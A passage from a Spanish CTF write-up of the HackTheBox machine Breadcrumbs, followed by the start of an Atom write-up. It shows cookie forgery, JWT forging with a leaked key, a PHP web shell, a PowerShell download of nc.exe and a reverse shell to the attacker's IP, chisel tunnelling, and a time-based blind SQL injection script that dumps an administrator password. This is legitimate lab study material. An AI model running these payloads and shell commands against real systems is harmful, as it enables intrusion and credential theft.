s4lTy_stR1nG_ . $username[$seed].  (!528. /9890 ;   echo  Key: $key\n ;    //Pasa el valor de la cadena a md5 e imprime el username+md5  $session_cookie = $username. md5($key);    //return $session_cookie;  echo $session_cookie;?&gt;Y si ejecutamos: Username: lanzMax: 3Seed: 3Key: s4lTy_stR1nG_z(!528. /9890lanz23ccbc5fab73e561862271461cc6bedcDe esto podemos concluir que al final solo se nos pueden generar 4 tipos de cookie, ya que lo √∫nico que var√≠a es el car√°cter y como nuestro nombre es de 4 pues solo pueden ser 4 üòá Ahora, teniendo en cuenta esto, podemos iterar sobre el usuario lanz y ver que cookies se le generan y ver si alguna coincide con la que tenemos actualmente. D√©mosle: &lt;?php  $username =  lanz ;  echo  Username: $username\n ;    #Toma el tama√±o del username y le quita 1 (lanz (4)-1=3)  $max = strlen($username) - 1;   echo  Max: $max\n\n ;    #Toma un numero (en este caso) entre 0 y 3 (0,1,2,3)  //$seed = rand(0, $max);    for ($seed = 0; $seed &lt; 4; $seed++) {    echo  Seed: $seed\n ;    echo  Letra: $username[$seed]\n ;      #Con el numero anterior extrae un caracter del user name y lo junta con dos cadenas    $key =  s4lTy_stR1nG_ . $username[$seed].  (!528. /9890 ;     echo  Key: $key\n ;      #Pasa el valor de la cadena a md5 e imprime el username+md5    $session_cookie = $username. md5($key);      //return $session_cookie;    echo $session_cookie.  \n\n ;  }?&gt;Y su resultado: Username: lanzMax: 3Seed: 0Letra: lKey: s4lTy_stR1nG_l(!528. /9890lanz47200b180ccd6835d25d034eeb6e6390Seed: 1Letra: aKey: s4lTy_stR1nG_a(!528. /9890lanz61ff9d4aaefe6bdf45681678ba89ff9dSeed: 2Letra: nKey: s4lTy_stR1nG_n(!528. /9890lanze640846cb7f7acdbe36b4f006d12fb3eSeed: 3Letra: zKey: s4lTy_stR1nG_z(!528. /9890lanz23ccbc5fab73e561862271461cc6bedc(Y si, una de las cookies que se genera, es la que tenemos actualmente en nuestra sesi√≥n) Ahora, hagamos lo mismo pero con paul:  https://paiza. io/projects/5iqJvM3BOwOFtZb0clK0Og. &lt;?php  $username =  paul ;. . . Username: paulMax: 3Seed: 0Letra: pKey: s4lTy_stR1nG_p(!528. /9890paula2a6a014d3bee04d7df8d5837d62e8c5Seed: 1Letra: aKey: s4lTy_stR1nG_a(!528. /9890paul61ff9d4aaefe6bdf45681678ba89ff9dSeed: 2Letra: uKey: s4lTy_stR1nG_u(!528. /9890paul8c8808867b53c49777fe5559164708c3Seed: 3Letra: lKey: s4lTy_stR1nG_l(!528. /9890paul47200b180ccd6835d25d034eeb6e6390Si probamos con un editor de cookie, logramos robarle la sesi√≥n a paul con la √∫ltima generada: Seed: 3Letra: lKey: s4lTy_stR1nG_l(!528. /9890paul47200b180ccd6835d25d034eeb6e6390 Ya podemos navegar tranquilamente sobre el recurso /files. php, pero hay un problema a√∫n, ya que el otro cookie (token) tiene contenido de lanz y no de paul asi que no podemos subir nada a√∫n: Si borramos la cookie token obtenemos este error: book=. . /portal/includes/fileController. php&amp;method=1&lt;?php$ret =   ;require  . . /vendor/autoload. php ;use \Firebase\JWT\JWT;session_start();function validate(){    $ret = false;   $jwt = $_COOKIE['token'];    $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';   $ret = JWT::decode($jwt, $secret_key, array('HS256'));   return $ret;}if($_SERVER['REQUEST_METHOD'] ===  POST ){  $admins = array( paul );  $user = validate()-&gt;data-&gt;username;   if(in_array($user, $admins) &amp;&amp; $_SESSION['username'] ==  paul ){    error_reporting(E_ALL &amp; ~E_NOTICE);    $uploads_dir = '. . /uploads';    $tmp_name = $_FILES[ file ][ tmp_name ];    $name = $_POST['task'];    if(move_uploaded_file($tmp_name,  $uploads_dir/$name )){      $ret =  Success. Have a great weekend! ;    }    else{    $ret =  Missing file or title :(  ;       }  }  else{  $ret =  Insufficient privileges. Contact admin or developer to upload code. Note: If you recently registered, please wait for one of our admins to approve it.  ;  }  echo $ret;}Vemos el proceso por el que pasa el archivo que subamos (no hay validaci√≥n de nada :O) y la carpeta en la que queda guardado: /uploads.  Siguiendo este post, podemos ver que hay detr√°s de la cadena token. Usando esta web tambi√©n vemos como esta conformado el token y asi mismo podemos modificarla para generar la de paul:  Guia para generar nuevos tokens apoyado en el secret key (que encontramos antes). Siguiendo la gu√≠a, ahora simplemente modificar√≠amos el username por paul y pondr√≠amos en ese cuadro la secret key, generar√≠amos e intentar√≠amos de nuevo subir el archivo . zip Validamos: Perfecto, ahora s√≠, modifiquemos con el editor de cookies la variable token y validemos desde la web: Si jugamos con burp para modificar el nombre con el que viaja logramos subir un archivo . php con contenido PHP: Original sin modificar: Spoiler: Ignoren el PHP, no puedo borrarlo :P Se subi√≥ como holi. zip, simplemente en Burp le cambiamos la extensi√≥n: . . . &lt;?phpecho  Hola ;?&gt;-----------------------------1138605338005785511225757143Content-Disposition: form-data; name= task holi. php. . .  Perfecto, ya con esto podemos conseguir ejecucion de comandos en el sistema, hag√°moslo para lanzarnos una Reverse Shell‚Ä¶ . . . Content-Type: application/x-php&lt;?php  $coma=shell_exec($_GET['xmd']); echo $coma;?&gt;-----------------------------1138605338005785511225757143. . . Enumerando podemos escribir en el directorio: C:\Users\www-data\Desktop\\xampp\tmpAprovechemos esto para subir el binario nc para posteriormente lanzarnos una petici√≥n hacia nuestro listener y obtener una Shell: Nos ponemos en escucha donde tengamos el binario y ejecutamos: ?xmd=powershell -c  IWR -uri http://10. 10. 14. 194:8000/nc64. exe -OutFile C:\\Users\\www-data\\Desktop\\xampp\\tmp\\nc. exe Validamos: ?xmd=dir C:\Users\www-data\Desktop\\xampp\tmp\ Volume in drive C has no label. Volume Serial Number is 7C07-CD3A Directory of C:\Users\www-data\Desktop\\xampp\tmp03/12/2021 12:55 PM  &lt;DIR&gt;     . 03/12/2021 12:55 PM  &lt;DIR&gt;     . . 03/12/2021 12:47 PM        12 holas. txt03/12/2021 12:55 PM      45,272 nc. exe03/12/2021 12:53 PM         0 sess_04f3tvcgqt3lcuabhihd56tbdv. . . Perfecto, ahora nos ponemos es escucha con nc y ejecutamos: ?xmd=C:\Users\www-data\Desktop\\xampp\tmp\nc. exe 10. 10. 14. 194 4433 -e cmd. exeYyyy: Tamos dentroooooooooooooooeoeoeowowoewoeowirjaksdfj (: Ahora a enumerar‚Ä¶  Script que nos permite ejecutar comandos automatizando todo lo anterior. ‚Ä¶ Movimiento lateral www-data -&gt; juliette #: D√°ndole un vistazo a los archivos que hay en la ruta /portal encontramos una carpeta llamativa sobre pizza :P PS C:\Users\www-data\Desktop\\xampp\htdocs\portal&gt; dir. . . Mode         LastWriteTime     Length Name----         -------------     ------ ----d-----     2/8/2021  5:37 AM        assetsd-----     2/8/2021  5:37 AM        dbd-----     2/8/2021  5:37 AM        includesd-----     2/8/2021  5:37 AM        phpd-----     2/8/2021  5:37 AM        pizzaDeliveryUserDatad-----     3/12/2021  4:46 PM        uploadsd-----     2/8/2021  5:37 AM        vendor-a----     2/1/2021 10:40 PM      3956 authController. php-a----     2/1/2021  9:40 PM      114 composer. json-a----    11/28/2020 12:55 AM      6140 composer. lock-a----     12/9/2020  3:30 PM      534 cookie. php-a----     2/1/2021  6:59 AM      3757 index. php-a----     2/1/2021  1:57 AM      2707 login. php-a----     1/16/2021  1:47 PM      694 logout. php-a----     2/1/2021  1:58 AM      2934 signup. phpPues si entramos: PS C:\Users\www-data\Desktop\\xampp\htdocs\portal\pizzaDeliveryUserData&gt; dir. . . Mode         LastWriteTime     Length Name----         -------------     ------ -----a----    11/28/2020  1:48 AM      170 alex. disabled-a----    11/28/2020  1:48 AM      170 emma. disabled-a----    11/28/2020  1:48 AM      170 jack. disabled-a----    11/28/2020  1:48 AM      170 john. disabled-a----     1/17/2021  3:11 PM      192 juliette. json-a----    11/28/2020  1:48 AM      170 lucas. disabled-a----    11/28/2020  1:48 AM      170 olivia. disabled-a----    11/28/2020  1:48 AM      170 paul. disabled-a----    11/28/2020  1:48 AM      170 sirine. disabled-a----    11/28/2020  1:48 AM      170 william. disabledY claramente vemos algo diferente (adem√°s de ser algo de juliette, que desde el inicio nos llam√≥ la atenci√≥n), juliette. json: PS C:\Users\www-data\Desktop\\xampp\htdocs\portal\pizzaDeliveryUserData&gt; type juliette. json{     pizza  :  margherita ,     size  :  large ,     drink  :  water ,     card  :  VISA ,     PIN  :  9890 ,     alternate  : {         username  :  juliette ,         password  :  jUli901. /())! ,    }}Tenemos nuevas credenciales, al parecer de un servicio de pizza, en el que juliette le da igual poner sus credenciales porque simplemente son del portal de pizza, no? Salgamos de la duda‚Ä¶ Usando SSH hacia la m√°quina: Perfecto, haciendo reutilizaci√≥n de credenciales logramos obtener una sesi√≥n como juliette dentro del sistema (: con ella tenemos la flag del usuario‚Ä¶ ‚Ä¶ Movimiento lateral juliette &gt; development #: Tenemos un archivo con tareas que juliette tiene planteado hacer: PS C:\Users\juliette\Desktop&gt; type . \todo. html&lt;html&gt;&lt;style&gt;html{background:black;color:orange;}table,th,td{border:1px solid orange;padding:1em;border-collapse:collapse;}&lt;/style&gt;&lt;table&gt;    &lt;tr&gt;      &lt;th&gt;Task&lt;/th&gt;      &lt;th&gt;Status&lt;/th&gt;      &lt;th&gt;Reason&lt;/th&gt;    &lt;/tr&gt;    &lt;tr&gt;      &lt;td&gt;Configure firewall for port 22 and 445&lt;/td&gt;      &lt;td&gt;Not started&lt;/td&gt;      &lt;td&gt;Unauthorized access might be possible&lt;/td&gt;    &lt;/tr&gt;    &lt;tr&gt;      &lt;td&gt;Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager&lt;/td&gt;      &lt;td&gt;In progress&lt;/td&gt;      &lt;td&gt;It stores passwords in plain text&lt;/td&gt;    &lt;/tr&gt;    &lt;tr&gt;      &lt;td&gt;Add new features to password manager&lt;/td&gt;      &lt;td&gt;Not started&lt;/td&gt;      &lt;td&gt;To get promoted, hopefully lol&lt;/td&gt;    &lt;/tr&gt;&lt;/table&gt;&lt;/html&gt;Si nos fijamos en la segunda tarea, habla sobre el software Microsoft Store Sticky Notes (app para tomar notas en el escritorio), que al parecer guarda las contrase√±as en texto plano‚Ä¶ Con esto en la cabeza y buscando en internet cu√°l es el directorio donde se guardan, encontramos este recurso:  How to back up and restore Sticky Notes in Windows 10.  Ac√° tambi√©n lo rese√±an, How to Back Up and Restore Sticky Notes in Windows. Donde nos habla que en la ruta: C:\Users\Username\AppData\Local\Packages\Microsoft. MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState Se encuentran archivos relacionados con Sticky Notes y si, validando encontramos la ruta: PS C:\Users\juliette\AppData\Local\Packages\Microsoft. MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState&gt; ls -force  Directory: C:\Users\juliette\AppData\Local\Packages\Microsoft. MicrosoftStickyNotes_8wekyb3d8bbwe\LocalStateMode         LastWriteTime     Length Name----         -------------     ------ -----a----     1/15/2021  4:10 PM     20480 15cbbc93e90a4d56bf8d9a29305b8981. storage. session-a----    11/29/2020  3:10 AM      4096 plum. sqlite-a----     1/15/2021  4:10 PM     32768 plum. sqlite-shm-a----     1/15/2021  4:10 PM     329632 plum. sqlite-walSi leemos el archivo plum. sqlite-wal vemos alg√∫n tipo de traza: Claramente vemos la contrase√±a de juliette y lo que parece ser otra contrase√±a de un usuario llamado development, si hacemos una validaci√≥n r√°pida de los usuarios tenemos: PS C:\Users\juliette\AppData\Local\Packages\Microsoft. MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState&gt; dir c:\Users  Directory: C:\UsersMode         LastWriteTime     Length Name----         -------------     ------ ----d-----     1/26/2021  9:06 AM        Administratord-----     1/26/2021  9:11 AM        developmentd-----     2/1/2021  5:48 AM        julietted-r---     1/15/2021  3:43 PM        Publicd-----     2/8/2021 10:13 PM        www-dataBien, existe‚Ä¶ Tambi√©n vemos la traza del usuario administrator, pero de √©l no vemos nada relevante‚Ä¶ Probemos con esa cadena contra el usuario development sobre el servicio SSH: Opa, efectivamente, tenemos una sesi√≥n como development, a ver que encontramos en √©l‚Ä¶ ‚Ä¶ Escalada de privilegios #: En la ra√≠z del sistema encontramos una carpeta relacionada con nuestro usuario: PS C:\&gt; dir  Directory: C:\Mode         LastWriteTime     Length Name----         -------------     ------ ----d-----     1/15/2021  4:03 PM        Anouncementsd-----     1/15/2021  4:03 PM        Developmentd-----     12/7/2019  1:14 AM        PerfLogsd-r---     2/1/2021  7:50 AM        Program Filesd-r---     12/7/2019  1:54 AM        Program Files (x86)d-r---     1/17/2021  1:41 AM        Usersd-----     2/1/2021  1:10 AM        WindowsPS C:\&gt;Dentro tenemos: PS C:\&gt; cd . \Development\PS C:\Development&gt; dir  Directory: C:\DevelopmentMode         LastWriteTime     Length Name----         -------------     ------ -----a----    11/29/2020  3:11 AM     18312 Krypter_LinuxAlgo curioso es que el owner del archivo es juliette, pero con su sesi√≥n no podemos entrar en esa carpeta, jmm. PS C:\Development&gt; Get-Acl . \Krypter_Linux  Directory: C:\DevelopmentPath     Owner        Access----     -----        ------Krypter_Linux BREADCRUMBS\juliette NT AUTHORITY\SYSTEM Allow ReadAndExecute, Synchronize. . .  Determine the owner of a file PowerShell.  Tambien podemos ver el owner en la cmd usando dir /q. Inspeccionemos el archivo‚Ä¶ (No nos deja ejecutarlo) PS C:\Development&gt; type . \Krypter_Linux‚åÇELF‚òª‚ò∫‚ò∫‚ô•&gt;‚ò∫. . . . . . New project by Juliette. New features added weekly!What to expect next update:    - Windows version with GUI support    - Get password from cloud and AUTOMATICALLY decrypt!***Requesting decryption key from cloud. . . Account: Administratorhttp://passmanager. htb:1234/index. phpmethod=select&amp;username=administrator&amp;table=passwordsServer response:Incorrect master keyNo key supplied. USAGE:. . . Vale vale valeeee, encontramos cosas interesantes:  Es un binario ELF.  Creado efectivamente por juliette.  Hace peticiones para desencriptar llaves desde la nube.  Account: Administrator (raro) Servicio sirviendo en el puerto 1234 del dominio passmanager. htb. http://passmanager. htb:1234/index. php?method=select&amp;username=administrator&amp;table=passwordsPodemos pensar en un Port Forwarding, validemos si el puerto esta escuchando localmente: PS C:\Development&gt; netstat -aActive Connections Proto Local Address     Foreign Address    State TCP  0. 0. 0. 0:22       Breadcrumbs:0     LISTENING TCP  0. 0. 0. 0:80       Breadcrumbs:0     LISTENING. . .  TCP  127. 0. 0. 1:1234     Breadcrumbs:0     LISTENING. . . Si lo esta‚Ä¶ Intentemos pasarnos el binario a nuestra m√°quina, a ver si logramos ejecutarlo. Nos compartimos una carpeta con SMB, la llamar√© smbFolder: ‚ù≠ python3 smbserver. py smbFolder $(pwd) -smb2supportImpacket v0. 9. 22 - Copyright 2020 SecureAuth Corporation[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3. 0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1. 0[*] Config file parsed[*] Config file parsed[*] Config file parsedY ahora en la m√°quina Windows, le indicamos que nos copie ese binario a trav√©s de una carpeta compartida en la red: PS C:\Development&gt; copy . \Krypter_Linux \\10. 10. 14. 194\smbFolder\Krypter_LinuxRecibimos info en nuestro servidor de la conexi√≥n entrante y ya tendr√≠amos el binario: ‚ù≠ file Krypter_Linux Krypter_Linux: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64. so. 2, BuildID[sha1]=ab1fa8d6929805501e1793c8b4ddec5c127c6a12, for GNU/Linux 3. 2. 0, not stripped‚ù≠ . /Krypter_Linux Krypter V1. 2New project by Juliette. New features added weekly!What to expect next update:    - Windows version with GUI support    - Get password from cloud and AUTOMATICALLY decrypt!***No key supplied. USAGE:Krypter &lt;key&gt;‚Ä¶ Podemos apoyarnos de cURL e intentar visitar el recurso al cual se esta llamando en el binario: PS C:\Development&gt; curl  http://passmanager. htb:1234/index. php?method=select&amp;username=administrator&amp;table=passwords curl : The remote name could not be resolved: 'passmanager. htb'. . . Exacto. Pero como ya vimos, esta localmente activo, asi que cambi√©mosla por localhost: PS C:\Development&gt; curl  http://localhost:1234/index. php?method=select&amp;username=administrator&amp;table=passwords    curl : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again. . . . Nos indica que debemos agregarle el par√°metro UseBasicParsing por unos temas de configuraci√≥n con Internet Explorer: PS C:\Development&gt; curl  http://localhost:1234/index. php?method=select&amp;username=administrator&amp;table=passwords  -UseBasicParsingStatusCode    : 200StatusDescription : OKContent      : selectarray(1) {           [0]=&gt;           array(1) {            [ aes_key ]=&gt;            string(16)  k19D193j. &lt;19391(            }          }RawContent    : HTTP/1. 1 200 OK          Content-Length: 96          Content-Type: text/html; charset=UTF-8          Date: Sat, 13 Mar 2021 04:01:30 GMT          Server: Apache/2. 4. 46 (Win64) OpenSSL/1. 1. 1h PHP/8. 0. 1          X-Powered-By: PHP/8. 0. 1          sel. . . Forms       :Headers      : {[Content-Length, 96], [Content-Type, text/html; charset=UTF-8], [Date, Sat, 13 Mar 2021 04:01:30 GMT], [Server, Apache/2. 4. 46 (Win64) OpenSSL/1. 1. 1h PHP/8. 0. 1]. . . }Images      : {}InputFields    : {}Links       : {}ParsedHtml    :RawContentLength : 96Ahora s√≠, tenemos una aes_key, una cabecera y nada m√°s‚Ä¶ Si provocamos un error obtenemos: PS C:\Development&gt; curl  http://localhost:1234/index. php?method=select&amp;username=administrator&amp;table='  -UseBasicParsing    StatusCode    : 200StatusDescription : OKContent      : select&lt;br /&gt;          &lt;b&gt;Fatal error&lt;/b&gt;: Uncaught TypeError: mysqli_fetch_all(): Argument #1 ($result) must be of type mysqli_result, bool given in          C:\Users\Administrator\Desktop\passwordManager\htdocs\index. . . RawContent    : HTTP/1. 1 200 OK. . . Probablemente debamos hacer SQLi o incluso fuzzing para encontrar otras tablas, pero intentando por consola no logre nada, adem√°s podemos pensar que el output es m√°s grande y ejecut√°ndolo por consola no nos lo muestra completo, quiz√°s por medio de la web obtengamos algo diferente, hagamos el Remote Port Forwarding, usar√© chisel:  Uno de los recursos en que me guie.  S4vitar tambi√©n tiene un video explic√°ndolo. Atacante (server): En su repo descargar en binario para:  Windows: chisel_1. 7. 6_windows_amd64. gz.  Linux: chisel_1. 7. 6_linux_amd64. gz.  (Esto para tener la misma version en los dos binarios y que no nos genere problemas de compatibilidad) #Para montarnos el server m√°s adelante‚ù≠ gunzip chisel_1. 7. 6_linux_amd64. gz‚ù≠ mv chisel_1. 7. 6_linux_amd64 chisel‚ù≠ chmod +x chisel#El binario a subir en la m√°quina Windows (descargado del repo)‚ù≠ gunzip chisel_1. 7. 6_windows_amd64. gz‚ù≠ upx chisel_1. 7. 8_windows_amd64 #Hacemos el binario un toque m√°s liviano‚ù≠ mv chisel_1. 7. 6_windows_amd64 chisel. exe‚ù≠ python3 smbserver. py smbFolder $(pwd) -smb2support. . . Victima (cliente): PS C:\Users\development\Videos&gt; copy \\10. 10. 14. 194\smbFolder\chisel. exe C:\Users\development\Videos\chisel. exePS C:\Users\development\Videos&gt; . \chisel. exe Usage: chisel [command] [--help] Version: 1. 7. 6 (go1. 16rc1) Commands:  server - runs chisel in server mode  client - runs chisel in client mode Read more:  https://github. com/jpillora/chiselAtacante (server): #Nos ponemos en escucha por el puerto 1111‚ù≠ . /chisel server -p 1111 --reverse2021/03/13 25:25:25 server: Reverse tunnelling enabled2021/03/13 25:25:25 server: Fingerprint 1kWWQwYT0YxKjY9xsxSSL76G0IJLlLThmvRQ+t/ZdoE=2021/03/13 25:25:25 server: Listening on http://0. 0. 0. 0:1111Victima (cliente): PS C:\Users\development\Videos&gt; . \chisel. exe client 10. 10. 14. 194:1111 R:1234:localhost:12342021/03/12 25:25:25 client: Connecting to ws://10. 10. 14. 194:11112021/03/12 25:25:25 client: Connected (Latency 117. 0553ms). . .  Le indicamos el puerto e IP en el que estamos escuchando: 10. 10. 14. 194:1111.  Cuando obtengamos la conexi√≥n, el puerto 1111 pasara a ser el puerto 1234 que se esta sirviendo localmente localhost:1234. Atacante (server): . . . 2021/03/13 25:25:25 server: session#1: tun: proxy#R:1234=&gt;localhost:1234: ListeningListo, validemos: ‚ù≠ curl  http://localhost:1234/index. php?method=select&amp;username=administrator&amp;table=passwords selectarray(1) { [0]=&gt; array(1) {  [ aes_key ]=&gt;  string(16)  k19D193j. &lt;19391(  }}En la web: ‚Ä¶ Despues de algo de pruebas sobre la URL, logramos obtener nuestro SQLi (es uno basado en tiempo), el par√°metro vulnerable es username, con este simple payload logramos darle a la p√°gina un tiempo de respuesta de 5 segundos, si refrescamos y la p√°gina se demora ese tiempo, quiere decir que tenemos inyecci√≥n (: http://127. 0. 0. 1:1234/index. php?method=select&amp;username=administrator' AND sleep(5) AND '1'='1&amp;table=passwordsohttp://127. 0. 0. 1:1234/index. php?method=select&amp;username=a' OR sleep(5) AND '1'='1&amp;table=passwordsListo, podemos crearnos un script para automatizar la extracci√≥n de la data. (Si recordamos cuando encontramos el archivo db. php habla de la base de datos llamada bread, podr√≠amos saltarnos este paso, pero igual se los quiero mostrar para que vean como es el proceso) ‚Ä¶ SQL injection - time based (blind) ‚åñ: Obtenemos nombre de la base de datos. üëÄ #!/usr/bin/python3import requests, timefrom pwn import *url =  http://localhost:1234/index. php p1 = log. progress( SQLi blind )p2 = log. progress( Database name )session = requests. Session()# Creamos nuestro  diccionario dic_letters =  abcdefghijklmnopqrstuvwxyz0123456789. +!$#-~}:\ \'{*][%,&amp;/\)(=ABCDEFGHIJKLMNOPQRSTUVWXYZ result =   # Recorrera 16 posiciones en la palabra, osea para intentar encontrar 16 caracteresfor position in range(1, 16):  # Toma cada caracter de nuestro  dic   for letter in dic_letters:    # Extrae el tiempo antes de la peticion    time_now = time. time()    payload =  ?method=select&amp;     payload +=  username=administrator' and if(substr(database(),%d,1)='%s',sleep(3),1) and '1'='1&amp;  % (position, letter)    payload +=  table=passwords     p1. status(payload)    r = session. get(url + payload)    # Extrae el tiempo despues de la peticion    time_after = time. time()    # Validamos los tiempos, si hay diferencia de 3 o m√°s, sabemos que esa peticion hablo con la base de datos, por lo tanto extraemos la letra     if time_after - time_now &gt; 2:      result += letter      p2. status(result)      breakp1. success( Done )p2. success(result) extract_db_name. py No s√© por qu√© toma los + como caracteres v√°lidos, pero bueno, obtenemos el nombre de la base de datos: bread. ‚Ä¶ Obtenemos tablas de la base de datos bread. üëÄ . . . # Para ir iterando entre las tablas, en este caso iterar en 5 tablas (asi evitamos errores)for table_num in range(0, 5):  p4 = log. progress( Table name )  for position in range(1, 16):    for letter in dic_letters:      time_now = time. time()      payload =  ?method=select&amp;       payload +=  username=administrator' and if(substr((SELECT table_name FROM information_schema. tables WHERE table_schema='bread' LIMIT %d,1),%d,1)='%s',sleep(3),1) and '1'='1&amp;  % (table_num, position, letter)      payload +=  table=passwords . . .  extract_tables. py Interesante, solo hay una tabla llamada passwords, extraigamos sus columnas‚Ä¶ ‚Ä¶ Obtenemos columnas de la tabla passwords. üëÄ . . . # Iteramos entre las columnasfor column_num in range(0, 5):  p4 = log. progress( Column name )  for position in range(1, 16):    for letter in dic_letters:      time_now = time. time()      payload =  ?method=select&amp;       payload +=  username=administrator' and if(substr((SELECT column_name FROM information_schema. columns WHERE table_schema='bread' and table_name='passwords' LIMIT %d,1),%d,1)='%s',sleep(3),1) and '1'='1&amp;  % (column_num, position, letter)      payload +=  table=passwords . . .  extract_columns. py Perfecto, tenemos 4 columnas, enfoqu√©monos en las columnas account y password para asi entender de quien es cada password.  aeskey es realmente aes_key, me di cuenta relacionandolo con la respuesta normal antes de hacer el SQLi (y pues que me faltaba ese char en el dic). ‚Ä¶ Obtenemos la informaci√≥n de la columna account. üëÄ . . . for acc_num in range(0, 3):  p4 = log. progress( Account )  for position in range(1, 16):    for letter in dic_letters:      time_now = time. time()      payload =  ?method=select&amp;       payload +=  username=administrator' and if(substr((SELECT account FROM passwords LIMIT %d,1),%d,1)='%s',sleep(3),1) and '1'='1&amp;  % (acc_num, position, letter)      payload +=  table=passwords . . .  extract_users. py Nice, solo hay un usuario, administrator, ahora veamos el contenido del campo password relacionado con el usuario administrator. ‚Ä¶ Obtenemos la informaci√≥n de la columna password. üëÄ . . . p2 = log. progress( Password administrator )# Agregamos mas posiciones, quizas la contrase√±a es largafor position in range(1, 70):  for letter in dic_letters:    time_now = time. time()    payload =  ?method=select&amp;     payload +=  username=administrator' and if(substr((SELECT password FROM passwords WHERE account='administrator'),%d,1)='%s',sleep(3),1) and '1'='1&amp;  % (position, letter)    payload +=  table=passwords . . . Opa, (vemos los + asi que cortamos desde ah√≠) obtenemos la contrase√±a del usuario administrator. (Antes de probarla contra SSH) creo que no nos va a funcionar, ya que no distingui√≥ entre may√∫sculas y min√∫sculas‚Ä¶ Y pues es muy raro que no tengamos ni una may√∫scula en una password tan larga. Intentamos conectarnos por medio de SSH: ‚ù≠ ssh administrator@10. 10. 10. 228administrator@10. 10. 10. 228's password: Permission denied, please try again. Efectivamente, no logramos entrar, asi que buscando en internet hay dos maneras para que mysql haga uso del case sensitive, la m√°s sencilla es usar BINARY al lado del objeto que estamos buscando:  How to check case sensitive SQL.  La segunda manera, usando valores ascii.  SPOILER M√ÅQUINA CACHE: La manera de los valores ascii la use en la m√°quina Cache, por si quieren hecharle un ojo. üëÄ . . .     payload =  ?method=select&amp;     payload +=  username=administrator' and if(substr((SELECT BINARY password FROM passwords WHERE account='administrator'),%d,1)='%s',sleep(3),1) and '1'='1&amp;  % (position, letter)    payload +=  table=passwords . . . Listo, ahora si (adem√°s que no nos muestra los +, asi que solucionamos dos problemas en uno), pero intentando con esa contrase√±a no obtenemos acceso tampoco‚Ä¶  Ac√° fue donde pense en la columna aes_key y que me faltaba el char ‚Äú_‚Äù en el dic, (aca a√∫n no me habia dado cuenta que me faltaba) asi que lo agregue y volvi a intentar, pero no, obtenemos la misma contrase√±a. Asi que debemos hacer algo con: H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=Si relacionamos la aes-key podemos pensar que debemos usarla para desencriptar la password y despues ah√≠ si usarla contra el usuario administrator sobre SSH‚Ä¶  Usando esta web, logramos desencriptar la cadena. Nos responde con una cadena en base64, si la tomamos y la decodeamos obtenemos la contrase√±a real: ‚ù≠ echo  cEBzc3cwcmQhQCMkOTg5MC4v  | base64 -d ; echop@ssw0rd!@#$9890. /Yyyy si ahora intentamos por SSH: SIIIIIIIIIIIIIIIIIIIIIIIII, ufff somos el usuario administrator dentro de la m√°quina. Y si, solo nos quedar√≠an ver las flags: ‚Ä¶ Les dejo el c√≥digo vulnerable al SQLi por si le quieren echar un ojo: PS C:\Users\Administrator\Desktop\passwordManager\htdocs&gt; type . \index. php&lt;?php$host= localhost ;$port=3306;$user= passwordM ;$password= hWjSh812jDn1asd. /213-91!#( ;$dbname= bread ;$method =   ;$con = new mysqli($host, $user, $password, $dbname, $port) or die ('Could not connect to the database server' . mysqli_connect_error());if(isset($_REQUEST['method'])){    $method = $_REQUEST['method'];}echo $method;if($method ==  select ){    $sql =  SELECT aes_key FROM  . $_REQUEST['table'].   WHERE account=' . $_REQUEST['username'].  ' ;    $results = $con-&gt;query($sql);    echo var_dump(mysqli_fetch_all($results,MYSQLI_ASSOC));}else{    echo  Bad Request ;}‚Ä¶ Linda m√°quina, mucho jugueteo con inyecciones, lo cual me encant√≥. El LFI fue loco de encontrar, pero prestando atenci√≥n lo logramos. El tema de las cookies no s√© que tan real puede ser (me suena que si), pero me gusto bastante tambi√©n. Y la inyecci√≥n SQL la disfrut√© un mont√≥n. En definitiva, excelente m√°quina para practicar este tipo de ataques. Adem√°s me sirvi√≥ para practicar mi scripting y crear lindos recursos para futuros usos:  RCE mediante el archivo . php (me gusto resto el script).  SQLi, fases para obtener la info de la base de datos. Por fin hemos llegado al final (e. e üèÉ‚Äç‚ôÄÔ∏è la disfrut√© mucho) nos leeremos en otra ocasi√≥n y como siempre, muchas gracias y a seguir rompiendo todo (: "
    }, {
    "id": 36,
    "url": "http://localhost:4000/htb/atom",
    "title": "HackTheBox - Atom",
    "body": "2021/07/10 - M√°quina Windows nivel medio. Jugaremos con SMB, recrearemos actualizaciones (feature de electron) en binarios para que sean ejecutados por un equipo de QA y encontraremos la relaci√≥n amorosa entre Redis y Kanban que nos permitir√° desencriptar contrase√±as del propio Redis.  TL;DR (Spanish writeup): Creada por: MrR3boot. A quemarnossssssss Atom es una m√°quina que nos ofrece un servicio web con un comprimido a ser descargado (poco hicimos con √©l (o bueno, poco mostr√© :P)) con un binario . exe, tambi√©n tendremos una carpeta compartida con SAMBA, de ella obtendremos un archivo . pdf. Nos damos cuenta de que es un manual de usuario indic√°ndonos algunos pasos interesantes‚Ä¶ Principalmente en la carpeta compartida hay 3 carpetas dentro, ellas est√°n relacionadas con un equipo de QA que va a estar verificando esas 3 carpetas en busca de cositas y si X cosa pasa lo ejecutara, esas cositas se llaman actualizaciones. Pero las actualizaciones tienen que estar relacionadas con electron-builder) (pista del PDF), investigando encontraremos una vulnerabilidad contra electron-builder que nos permite ejecutar comandos remotamente a trav√©s de un fallo en un feature (que se enfoca en encontrar actualizaciones en binarios), ac√° entran en juego las 3 carpetas. Nosotros tendremos que recrear una actualizaci√≥n de un binario (malicioso), esto a trav√©s del archivo latest. yml (que el feature (equipo de QA) va a estar buscando constantemente en las carpetas de actualizaciones), con esto lograremos que la m√°quina (feature/QA) ejecute el binario y en nuestro caso nos devuelva una Reverse Shell como el usuario jason. (Un poco (bastante) dif√≠cil explicar esa parte en poquitas l√≠neas).  electroPWn. py, script que automatiza este proceso y nos devuelve una Shell. Estando dentro de la m√°quina enumeraremos el servicio Redis, encontraremos unas credenciales en un archivo de configuraci√≥n 